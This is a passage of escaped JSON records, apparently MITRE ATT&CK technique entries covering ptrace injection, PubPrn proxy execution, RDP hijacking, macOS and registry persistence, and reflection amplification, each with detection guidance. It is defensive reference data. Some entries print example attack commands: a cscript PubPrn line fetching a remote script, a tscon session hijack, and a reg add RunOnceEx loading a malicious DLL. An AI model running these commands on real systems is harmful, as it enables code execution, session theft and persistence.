injection in running process using ptrace. Retrieved February 21, 2020.\",\"source_name\":\"Medium Ptrace JUL 2018\",\"url\":\"https://medium.com/@jain.sm/code-injection-in-running-process-using-ptrace-d3ea7191a4be\"},{\"description\":\"Colgan, T. (2015, August 15). Linux-Inject. Retrieved February 21, 2020.\",\"source_name\":\"BH Linux Inject\",\"url\":\"https://github.com/gaffe23/linux-inject/blob/master/slides_BHArsenal2015.pdf\"},{\"description\":\"Ligh, M.H. et al.. (2014, July). The Art of Memory Forensics: Detecting Malware and Threats in Windows, Linux, and Mac Memory. Retrieved December 20, 2017.\",\"source_name\":\"ArtOfMemoryForensics\"},{\"description\":\"GNU. (2010, February 5). The GNU Accounting Utilities. Retrieved December 20, 2017.\",\"source_name\":\"GNU Acct\",\"url\":\"https://www.gnu.org/software/acct/\"},{\"description\":\"Jahoda, M. et al.. (2017, March 14). redhat Security Guide - Chapter 7 - System Auditing. Retrieved December 20, 2017.\",\"source_name\":\"RHEL auditd\",\"url\":\"https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/security_guide/chap-system_auditing\"},{\"description\":\"stderr. (2014, February 14). Detecting Userland Preload Rootkits. Retrieved December 20, 2017.\",\"source_name\":\"Chokepoint preload rootkits\",\"url\":\"http://www.chokepoint.net/2014/02/detecting-userland-preload-rootkits.html\"}],\"id\":\"attack-pattern--ea016b56-ae0e-47fe-967a-cc0ad51af67f\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"privilege-escalation\"}],\"modified\":\"2020-06-20T22:24:56.734Z\",\"name\":\"Ptrace System Calls\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"System calls\",\"Process monitoring\"],\"x_mitre_defense_bypassed\":[\"Anti-virus\",\"Application control\"],\"x_mitre_detection\":\"Monitoring for Linux specific calls such as the ptrace system call should not generate large amounts of data due to their specialized nature, and can be a very effective method to detect some of the common process injection methods.(Citation: ArtOfMemoryForensics)  (Citation: GNU Acct)  (Citation: RHEL auditd)  (Citation: Chokepoint preload rootkits) \\n\\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. \",\"x_mitre_is_subtechnique\":true,\"x_mitre_platforms\":[\"Linux\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-02-03T16:49:57.788Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may use the trusted PubPrn script to proxy execution of malicious files. This behavior may bypass signature validation restrictions and application control solutions that do not account for use of these scripts.\\n\\n<code>PubPrn.vbs</code> is a Visual Basic script that publishes a printer to Active Directory Domain Services. The script is signed by Microsoft and can be used to proxy execution from a remote site.(Citation: Enigma0x3 PubPrn Bypass) An example command is <code>cscript C[:]\\\\Windows\\\\System32\\\\Printing_Admin_Scripts\\\\en-US\\\\pubprn[.]vbs 127.0.0.1 script:http[:]//192.168.1.100/hi.png</code>.\",\"external_references\":[{\"external_id\":\"T1216.001\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1216/001\"},{\"description\":\"Nelson, M. (2017, August 3). WSH INJECTION: A CASE STUDY. Retrieved April 9, 2018.\",\"source_name\":\"Enigma0x3 PubPrn Bypass\",\"url\":\"https://enigma0x3.net/2017/08/03/wsh-injection-a-case-study/\"}],\"id\":\"attack-pattern--09cd431f-eaf4-4d2a-acaf-2a7acfe7ed58\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-06-08T23:36:30.648Z\",\"name\":\"PubPrn\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Process command-line parameters\",\"Process monitoring\"],\"x_mitre_detection\":\"Monitor script processes, such as `cscript`, and command-line parameters for scripts like PubPrn.vbs that may be used to proxy execution of malicious files.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-03-09T14:38:24.334Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may abuse Python commands and scripts for execution. Python is a very popular scripting/programming language, with capabilities to perform many functions. Python can be executed interactively from the command-line (via the <code>python.exe</code> interpreter) or via scripts (.py) that can be written and distributed to different systems. Python code can also be compiled into binary executables.\\n\\nPython comes with many built-in packages to interact with the underlying system, such as file operations and device I/O. Adversaries can use these libraries to download and execute commands or other scripts as well as perform various malicious behaviors.\",\"external_references\":[{\"external_id\":\"T1059.006\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1059/006\"}],\"id\":\"attack-pattern--cc3502b5-30cc-4473-ad48-42d51a6ef6d1\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"execution\"}],\"modified\":\"2020-06-23T19:03:15.180Z\",\"name\":\"Python\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"System calls\",\"Process monitoring\",\"Process command-line parameters\",\"API monitoring\"],\"x_mitre_detection\":\"Monitor systems for abnormal Python usage and python.exe behavior, which could be an indicator of malicious activity. Understanding standard usage patterns is important to avoid a high number of false positives. If scripting is restricted for normal users, then any attempts to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.\\n\\nScripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information Discovery, Collection, or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"Administrator\",\"SYSTEM\",\"root\"],\"x_mitre_platforms\":[\"Linux\",\"Windows\",\"macOS\"],\"x_mitre_system_requirements\":[\"Python is installed.\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-05-31T21:30:25.584Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.\\n\\nThe Registry contains a significant amount of information about the operating system, configuration, software, and security.(Citation: Wikipedia Windows Registry) Information can easily be queried using the [Reg](https://attack.mitre.org/software/S0075) utility, though other means to access the Registry exist. Some of the information may help adversaries to further their operation within a network. Adversaries may use the information from [Query Registry](https://attack.mitre.org/techniques/T1012) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\",\"external_references\":[{\"external_id\":\"T1012\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1012\"},{\"external_id\":\"CAPEC-647\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/647.html\"},{\"description\":\"Wikipedia. (n.d.). Windows Registry. Retrieved February 2, 2015.\",\"source_name\":\"Wikipedia Windows Registry\",\"url\":\"https://en.wikipedia.org/wiki/Windows_Registry\"}],\"id\":\"attack-pattern--c32f7008-9fea-41f7-8366-5eb9b74bd896\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"discovery\"}],\"modified\":\"2020-03-26T18:08:20.049Z\",\"name\":\"Query Registry\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Windows Registry\",\"Process monitoring\",\"Process command-line parameters\"],\"x_mitre_detection\":\"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\\n\\nInteraction with the Windows Registry may come from the command line using utilities such as [Reg](https://attack.mitre.org/software/S0075) or through running malware that may interact with the Registry through an API. Command-line invocation of utilities used to query the Registry may be detected through process and command-line monitoring. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\",\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"User\",\"Administrator\",\"SYSTEM\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.2\"}",
    "{\"created\":\"2020-02-25T18:35:42.765Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may hijack a legitimate user’s remote desktop session to move laterally within an environment. Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS).(Citation: TechNet Remote Desktop Services)\\n\\nAdversaries may perform RDP session hijacking which involves stealing a legitimate user\'s remote session. Typically, a user is notified when someone else is trying to steal their session. With System permissions and using Terminal Services Console, `c:\\\\windows\\\\system32\\\\tscon.exe [session number to be stolen]`, an adversary can hijack a session without the need for credentials or prompts to the user.(Citation: RDP Hijacking Korznikov) This can be done remotely or locally and with active or disconnected sessions.(Citation: RDP Hijacking Medium) It can also lead to [Remote System Discovery](https://attack.mitre.org/techniques/T1018) and Privilege Escalation by stealing a Domain Admin or higher privileged account session. All of this can be done by using native Windows commands, but it has also been added as a feature in red teaming tools.(Citation: Kali Redsnarf)\",\"external_references\":[{\"external_id\":\"T1563.002\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1563/002\"},{\"description\":\"Microsoft. (n.d.). Remote Desktop Services. Retrieved June 1, 2016.\",\"source_name\":\"TechNet Remote Desktop Services\",\"url\":\"https://technet.microsoft.com/en-us/windowsserver/ee236407.aspx\"},{\"description\":\"Korznikov, A. (2017, March 17). Passwordless RDP Session Hijacking Feature All Windows versions. Retrieved December 11, 2017.\",\"source_name\":\"RDP Hijacking Korznikov\",\"url\":\"http://www.korznikov.com/2017/03/0-day-or-feature-privilege-escalation.html\"},{\"description\":\"Beaumont, K. (2017, March 19). RDP hijacking\u{200a}—\u{200a}how to hijack RDS and RemoteApp sessions transparently to move through an organisation. Retrieved December 11, 2017.\",\"source_name\":\"RDP Hijacking Medium\",\"url\":\"https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6\"},{\"description\":\"NCC Group PLC. (2016, November 1). Kali Redsnarf. Retrieved December 11, 2017.\",\"source_name\":\"Kali Redsnarf\",\"url\":\"https://github.com/nccgroup/redsnarf\"}],\"id\":\"attack-pattern--e0033c16-a07e-48aa-8204-7c3ca669998c\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"lateral-movement\"}],\"modified\":\"2020-03-23T23:24:39.182Z\",\"name\":\"RDP Hijacking\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Process monitoring\",\"Netflow/Enclave netflow\",\"Authentication logs\"],\"x_mitre_detection\":\"Consider monitoring processes for `tscon.exe` usage and monitor service creation that uses `cmd.exe /k` or `cmd.exe /c` in its arguments to detect RDP session hijacking.\\n\\nUse of RDP may be legitimate, depending on the network environment and how it is used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior with RDP.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"SYSTEM\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-12-14T16:46:06.044Z\",\"external_references\":[{\"external_id\":\"T1163\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1163\"},{\"description\":\"Apple. (2016, September 13). Startup Items. Retrieved July 11, 2017.\",\"source_name\":\"Startup Items\",\"url\":\"https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/StartupItems.html\"},{\"description\":\"Patrick Wardle. (2014, September). Methods of Malware Persistence on Mac OS X. Retrieved July 5, 2017.\",\"source_name\":\"Methods of Mac Malware Persistence\",\"url\":\"https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf\"}],\"id\":\"attack-pattern--18d4ab39-12ed-4a16-9fdb-ae311bba4a0f\",\"modified\":\"2020-01-15T16:27:32.362Z\",\"name\":\"Rc.common\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-01-15T16:25:22.260Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may use rc.common automatically executed at boot initialization to establish persistence. During the boot process, macOS executes <code>source /etc/rc.common</code>, which is a shell script containing various utility functions. This file also defines routines for processing command-line arguments and for gathering system settings and is thus recommended to include in the start of Startup Item Scripts (Citation: Startup Items). In macOS and OS X, this is now a deprecated mechanism in favor of [Launch Agent](https://attack.mitre.org/techniques/T1543/001) and [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) but is currently still used.\\n\\nAdversaries can use the rc.common file as a way to hide code for persistence that will execute on each reboot as the root user. (Citation: Methods of Mac Malware Persistence)\",\"external_references\":[{\"external_id\":\"T1037.004\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1037/004\"},{\"description\":\"Apple. (2016, September 13). Startup Items. Retrieved July 11, 2017.\",\"source_name\":\"Startup Items\",\"url\":\"https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/StartupItems.html\"},{\"description\":\"Patrick Wardle. (2014, September). Methods of Malware Persistence on Mac OS X. Retrieved July 5, 2017.\",\"source_name\":\"Methods of Mac Malware Persistence\",\"url\":\"https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf\"}],\"id\":\"attack-pattern--dca670cf-eeec-438f-8185-fd959d9ef211\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"privilege-escalation\"}],\"modified\":\"2020-03-24T23:46:20.433Z\",\"name\":\"Rc.common\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Process monitoring\",\"File monitoring\"],\"x_mitre_detection\":\"The <code>/etc/rc.common</code> file can be monitored to detect changes from the company policy. Monitor process execution resulting from the rc.common script for unusual or unknown applications or behavior. \",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"root\"],\"x_mitre_platforms\":[\"macOS\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-12-14T16:46:06.044Z\",\"external_references\":[{\"external_id\":\"T1164\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1164\"},{\"description\":\"Patrick Wardle. (2014, September). Methods of Malware Persistence on Mac OS X. Retrieved July 5, 2017.\",\"source_name\":\"Methods of Mac Malware Persistence\",\"url\":\"https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf\"}],\"id\":\"attack-pattern--6a3be63a-64c5-4678-a036-03ff8fc35300\",\"modified\":\"2020-01-24T18:26:18.933Z\",\"name\":\"Re-opened Applications\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-01-24T18:15:06.641Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may modify plist files to automatically run an application when a user logs in. Starting in Mac OS X 10.7 (Lion), users can specify certain applications to be re-opened when a user logs into their machine after reboot. While this is usually done via a Graphical User Interface (GUI) on an app-by-app basis, there are property list files (plist) that contain this information as well located at <code>~/Library/Preferences/com.apple.loginwindow.plist</code> and <code>~/Library/Preferences/ByHost/com.apple.loginwindow.* .plist</code>. \\n\\nAn adversary can modify one of these files directly to include a link to their malicious executable to provide a persistence mechanism each time the user reboots their machine (Citation: Methods of Mac Malware Persistence).\",\"external_references\":[{\"external_id\":\"T1547.007\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1547/007\"},{\"description\":\"Patrick Wardle. (2014, September). Methods of Malware Persistence on Mac OS X. Retrieved July 5, 2017.\",\"source_name\":\"Methods of Mac Malware Persistence\",\"url\":\"https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf\"}],\"id\":\"attack-pattern--e5cc9e7a-e61a-46a1-b869-55fb6eab058e\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"privilege-escalation\"}],\"modified\":\"2020-01-24T19:51:37.795Z\",\"name\":\"Re-opened Applications\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"File monitoring\"],\"x_mitre_detection\":\"Monitoring the specific plist files associated with reopening applications can indicate when an application has registered itself to be reopened.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"macOS\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-05-31T21:31:18.867Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"**This technique has been deprecated. Please use [Create Account](https://attack.mitre.org/techniques/T1136), [Web Shell](https://attack.mitre.org/techniques/T1505/003), and [External Remote Services](https://attack.mitre.org/techniques/T1133) where appropriate.**\\n\\nAdversaries may use more than one remote access tool with varying command and control protocols or credentialed access to remote services so they can maintain access if an access mechanism is detected or mitigated. \\n\\nIf one type of tool is detected and blocked or removed as a response but the organization did not gain a full understanding of the adversary\'s tools and access, then the adversary will be able to retain access to the network. Adversaries may also attempt to gain access to [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use [External Remote Services](https://attack.mitre.org/techniques/T1133) such as external VPNs as a way to maintain access despite interruptions to remote access tools deployed within a target network.(Citation: Mandiant APT1) Adversaries may also retain access through cloud-based infrastructure and applications.\\n\\nUse of a [Web Shell](https://attack.mitre.org/techniques/T1100) is one such way to maintain access to a network through an externally accessible Web server.\",\"external_references\":[{\"external_id\":\"T1108\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1108\"},{\"description\":\"Mandiant. (n.d.). APT1 Exposing One of China’s Cyber Espionage Units. Retrieved July 18, 2016.\",\"source_name\":\"Mandiant APT1\",\"url\":\"https://www.fireeye.com/content/dam/fireeye-www/services/pdfs/mandiant-apt1-report.pdf\"}],\"id\":\"attack-pattern--6aabc5ec-eae6-422c-8311-38d45ee9838a\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"}],\"modified\":\"2020-03-30T13:47:29.922Z\",\"name\":\"Redundant Access\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Praetorian\"],\"x_mitre_data_sources\":[\"Office 365 account logs\",\"Azure activity logs\",\"AWS CloudTrail logs\",\"Stackdriver logs\",\"Process monitoring\",\"Process use of network\",\"Packet capture\",\"Network protocol analysis\",\"File monitoring\",\"Authentication logs\",\"Binary file metadata\"],\"x_mitre_defense_bypassed\":[\"Network intrusion detection system\",\"Anti-virus\"],\"x_mitre_deprecated\":true,\"x_mitre_detection\":\"Existing methods of detecting remote access tools are helpful. Backup remote access tools or other access points may not have established command and control channels open during an intrusion, so the volume of data transferred may not be as high as the primary channel unless access is lost.\\n\\nDetection of tools based on beacon traffic, Command and Control protocol, or adversary infrastructure require prior threat intelligence on tools, IP addresses, and/or domains the adversary may use, along with the ability to detect use at the network boundary. Prior knowledge of indicators of compromise may also help detect adversary tools at the endpoint if tools are available to scan for those indicators.\\n\\nIf an intrusion is in progress and sufficient endpoint data or decoded command and control traffic is collected, then defenders will likely be able to detect additional tools dropped as the adversary is conducting the operation.\\n\\nFor alternative access using externally accessible VPNs or remote services, follow detection recommendations under [Valid Accounts](https://attack.mitre.org/techniques/T1078) and [External Remote Services](https://attack.mitre.org/techniques/T1133) to collect account use information.\",\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"User\",\"Administrator\",\"SYSTEM\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\",\"AWS\",\"GCP\",\"Azure\",\"Office 365\",\"SaaS\",\"Azure AD\"],\"x_mitre_version\":\"3.0\"}",
    "{\"created\":\"2020-03-02T20:08:03.691Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may attempt to cause a denial of service by reflecting a high-volume of network traffic to a target. This type of Network DoS takes advantage of a third-party server intermediary that hosts and will respond to a given spoofed source IP address. This third-party server is commonly termed a reflector. An adversary accomplishes a reflection attack by sending packets to reflectors with the spoofed address of the victim. Similar to Direct Network Floods, more than one system may be used to conduct the attack, or a botnet may be used. Likewise, one or more reflector may be used to focus traffic on the target.(Citation: Cloudflare ReflectionDoS May 2017)\\n\\nReflection attacks often take advantage of protocols with larger responses than requests in order to amplify their traffic, commonly known as a Reflection Amplification attack. Adversaries may be able to generate an increase in volume of attack traffic that is several orders of magnitude greater than the requests sent to the amplifiers. The extent of this increase will depending upon many variables, such as the protocol in question, the technique used, and the amplifying servers that actually produce the amplification in attack volume. Two prominent protocols that have enabled Reflection Amplification Floods are DNS(Citation: Cloudflare DNSamplficationDoS) and NTP(Citation: Cloudflare NTPamplifciationDoS), though the use of several others in the wild have been documented.(Citation: Arbor AnnualDoSreport Jan 2018)  In particular, the memcache protocol showed itself to be a powerful protocol, with amplification sizes up to 51,200 times the requesting packet.(Citation: Cloudflare Memcrashed Feb 2018)\",\"external_references\":[{\"external_id\":\"T1498.002\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1498/002\"},{\"description\":\"Marek Majkowsk, Cloudflare. (2017, May 24). Reflections on reflection (attacks). Retrieved April 23, 2019.\",\"source_name\":\"Cloudflare ReflectionDoS May 2017\",\"url\":\"https://blog.cloudflare.com/reflections-on-reflections/\"},{\"description\":\"Cloudflare. (n.d.). What is a DNS amplification attack?. Retrieved April 23, 2019.\",\"source_name\":\"Cloudflare DNSamplficationDoS\",\"url\":\"https://www.cloudflare.com/learning/ddos/dns-amplification-ddos-attack/\"},{\"description\":\"Cloudflare. (n.d.). What is a NTP amplificaiton attack?. Retrieved April 23, 2019.\",\"source_name\":\"Cloudflare NTPamplifciationDoS\",\"url\":\"https://www.cloudflare.com/learning/ddos/ntp-amplification-ddos-attack/\"},{\"description\":\"Philippe Alcoy, Steinthor Bjarnason, Paul Bowen, C.F. Chui, Kirill Kasavchnko, and Gary Sockrider of Netscout Arbor. (2018, January). Insight into the Global Threat Landscape - Netscout Arbor\'s 13th Annual Worldwide Infrastructure Security Report. Retrieved April 22, 2019.\",\"source_name\":\"Arbor AnnualDoSreport Jan 2018\",\"url\":\"https://pages.arbornetworks.com/rs/082-KNA-087/images/13th_Worldwide_Infrastructure_Security_Report.pdf\"},{\"description\":\"Marek Majkowski of Cloudflare. (2018, February 27). Memcrashed - Major amplification attacks from UDP port 11211. Retrieved April 18, 2019.\",\"source_name\":\"Cloudflare Memcrashed Feb 2018\",\"url\":\"https://blog.cloudflare.com/memcrashed-major-amplification-attacks-from-port-11211/\"},{\"description\":\"Cisco. (n.d.). Detecting and Analyzing Network Threats With NetFlow. Retrieved April 25, 2019.\",\"source_name\":\"Cisco DoSdetectNetflow\",\"url\":\"https://www.cisco.com/c/en/us/td/docs/ios-xml/ios/netflow/configuration/15-mt/nf-15-mt-book/nf-detct-analy-thrts.pdf\"}],\"id\":\"attack-pattern--36b2a1d7-e09e-49bf-b45e-477076c2ec01\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"impact\"}],\"modified\":\"2020-03-23T12:55:30.119Z\",\"name\":\"Reflection Amplification\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Sensor health and status\",\"Network protocol analysis\",\"Netflow/Enclave netflow\",\"Network intrusion detection system\",\"Network device logs\"],\"x_mitre_detection\":\"Detection of reflection amplification can sometimes be achieved before the traffic volume is sufficient to cause impact to the availability of the service, but such response time typically requires very aggressive monitoring and responsiveness or services provided by an upstream network service provider. Typical network throughput monitoring tools such as netflow(Citation: Cisco DoSdetectNetflow), SNMP, and custom scripts can be used to detect sudden increases in network or service utilization. Real-time, automated, and qualitative study of the network traffic can identify a sudden surge in one type of protocol can be used to detect a reflection amplification DoS event as it starts. Often, the lead time may be small and the indicator of an event availability of the network or service drops. The analysis tools mentioned can then be used to determine the type of DoS causing the outage and help with remediation.\",\"x_mitre_impact_type\":[\"Availability\"],\"x_mitre_is_subtechnique\":true,\"x_mitre_platforms\":[\"macOS\",\"Windows\",\"Linux\",\"AWS\",\"Office 365\",\"Azure AD\",\"GCP\",\"Azure\",\"SaaS\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-05-31T21:30:49.988Z\",\"external_references\":[{\"external_id\":\"T1060\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1060\"},{\"external_id\":\"CAPEC-270\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/270.html\"},{\"description\":\"Microsoft. (n.d.). Run and RunOnce Registry Keys. Retrieved November 12, 2014.\",\"source_name\":\"Microsoft Run Key\",\"url\":\"http://msdn.microsoft.com/en-us/library/aa376977\"},{\"description\":\"Microsoft. (2018, August 20). Description of the RunOnceEx Registry Key. Retrieved June 29, 2018.\",\"source_name\":\"Microsoft RunOnceEx APR 2018\",\"url\":\"https://support.microsoft.com/help/310593/description-of-the-runonceex-registry-key\"},{\"description\":\"Moe, O. (2018, March 21). Persistence using RunOnceEx - Hidden from Autoruns.exe. Retrieved June 29, 2018.\",\"source_name\":\"Oddvar Moe RunOnceEx Mar 2018\",\"url\":\"https://oddvar.moe/2018/03/21/persistence-using-runonceex-hidden-from-autoruns-exe/\"},{\"description\":\"Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.\",\"source_name\":\"TechNet Autoruns\",\"url\":\"https://technet.microsoft.com/en-us/sysinternals/bb963902\"}],\"id\":\"attack-pattern--9422fc14-1c43-410d-ab0f-a709b76c72dc\",\"modified\":\"2020-01-23T22:05:32.409Z\",\"name\":\"Registry Run Keys / Startup Folder\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-01-23T22:02:48.566Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \\\"run keys\\\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. (Citation: Microsoft Run Key) These programs will be executed under the context of the user and will have the account\'s associated permissions level.\\n\\nPlacing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is <code>C:\\\\Users\\\\[Username]\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup</code>. The startup folder path for all users is <code>C:\\\\ProgramData\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\StartUp</code>.\\n\\nThe following run keys are created by default on Windows systems:\\n* <code>HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run</code>\\n* <code>HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnce</code>\\n* <code>HKEY_LOCAL_MACHINE\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run</code>\\n* <code>HKEY_LOCAL_MACHINE\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnce</code>\\n\\nThe <code>HKEY_LOCAL_MACHINE\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnceEx</code> is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency. (Citation: Microsoft RunOnceEx APR 2018) For example, it is possible to load a DLL at logon using a \\\"Depend\\\" key with RunOnceEx: <code>reg add HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnceEx\\\\0001\\\\Depend /v 1 /d \\\"C:\\\\temp\\\\evil[.]dll\\\"</code> (Citation: Oddvar Moe RunOnceEx Mar 2018)\\n\\nThe following Registry keys can be used to set startup folder items for persistence:\\n* <code>HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\User Shell Folders</code>\\n* 